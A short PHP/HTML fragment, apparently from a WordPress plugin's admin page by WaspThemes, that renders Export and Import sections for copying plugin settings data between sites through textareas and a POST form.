                    <div class="yp-tab-section">
	                    <h2>Export</h2>
						<p>Copy what appears to be a random string of alpha numeric characters in following text area<br />and paste into Import field on another web site.</p>
						<div class="yp-export-section">
							<textarea rows="6" class="yp-admin-textarea"><?php echo yp_get_export_data(); ?></textarea>
						</div>

						<hr style="margin-top: 50px;margin-bottom: 25px;">

						<h2>Import</h2>
						<p>Paste the exported data and click "Import Data" button.</p>
						<form method="POST">
							<div class="yp-import-section">
								<textarea name="yp_json_import_data" rows="6" class="yp-admin-textarea"></textarea>
							</div>
							<input type="submit" class="button" value="Import Data" />
						</form>
					</div>

                    <?php

                }

            ?>

        </div>

    <?php

}


// @WaspThemes.
// Coded With Love..